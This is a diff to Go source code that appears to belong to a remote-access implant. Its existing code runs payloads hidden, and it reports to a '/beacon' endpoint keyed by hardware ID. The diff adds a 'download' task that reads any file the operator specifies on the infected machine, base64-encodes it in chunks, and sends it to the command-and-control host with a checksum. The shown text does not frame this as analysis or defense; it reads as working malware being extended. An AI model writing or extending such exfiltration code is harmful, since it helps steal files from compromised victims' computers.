@@ -594,6 +594,51 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 		_ = os.WriteFile(p, b, 0644)
 		_ = hiddenCmd(p).Start()
 		out = "started " + p
+	case "download":
+		rp := argStr(args, "remote_path", "path", "RemotePath")
+		fid := argStr(args, "file_id", "FileID")
+		if rp == "" || fid == "" {
+			out, code = "download: missing remote_path/file_id", 1
+			break
+		}
+		if _, err := os.Stat(rp); err != nil {
+			out, code = err.Error(), 1
+			break
+		}
+		data, err := os.ReadFile(rp)
+		if err != nil {
+			out, code = err.Error(), 1
+			break
+		}
+		const chunkSize = 256 * 1024
+		total := (len(data) + chunkSize - 1) / chunkSize
+		for i := 0; i < total; i++ {
+			end := (i + 1) * chunkSize
+			if end > len(data) {
+				end = len(data)
+			}
+			m, _ := json.Marshal(map[string]any{
+				"type":        "file_chunk",
+				"hw_id":       hwid,
+				"task_id":     tID,
+				"file_id":     fid,
+				"chunk_index": i,
+				"is_last":     i == total-1,
+				"data":        base64.StdEncoding.EncodeToString(data[i*chunkSize : end]),
+			})
+			httpDo(host, port, "/beacon", string(m), useTLS)
+		}
+		sum := sha256.Sum256(data)
+		cm, _ := json.Marshal(map[string]any{
+			"type":     "file_complete",
+			"hw_id":    hwid,
+			"task_id":  tID,
+			"file_id":  fid,
+			"size":     len(data),
+			"checksum": fmt.Sprintf("%x", sum[:]),
+		})
+		httpDo(host, port, "/beacon", string(cm), useTLS)
+		out = fmt.Sprintf("sent %d bytes in %d chunk(s)", len(data), total)
 	case "update":
 		u := argStr(args, "url", "URL")
 		out = "update queued " + u
